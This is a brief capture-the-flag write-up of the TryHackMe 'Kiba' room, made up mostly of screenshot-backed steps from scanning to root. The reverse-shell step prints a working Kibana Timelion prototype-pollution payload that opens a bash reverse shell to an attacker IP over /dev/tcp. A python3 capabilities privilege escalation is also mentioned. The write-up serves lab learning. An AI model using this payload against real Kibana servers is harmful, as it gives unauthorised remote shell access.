# Kiba

![](https://tryhackme-images.s3.amazonaws.com/room-icons/ea4429193c0250f0949cec4234d8037b.png)

---

## nmap

> The service on 5601 is kibana

![](images/nmap.png)

## vuln

> Copy and paste the first task into google to find kibana CVE

![](images/cve.png)

## kibana dashboard

> Go to kibana dashboard

![](images/dashboard.png)

## reverse shell

> Exploit the Timelion section using prototype pollution to execute the reverse shell and get the user account
```javascript
.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -c \'bash -i>& /dev/tcp/10.11.19.194/1337 0>&1\'");//')
.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
```

![](images/reverseshell.png)

![](images/user.png)

## User Flag

![](images/userflag.png)

## PrivEsc

> List programs with capabilities set, take not of python3

![](images/caps.png)

> Exploit the python3 capabilities to get root

![](images/root.png)

## Root Flag

![](images/rootflag.png)
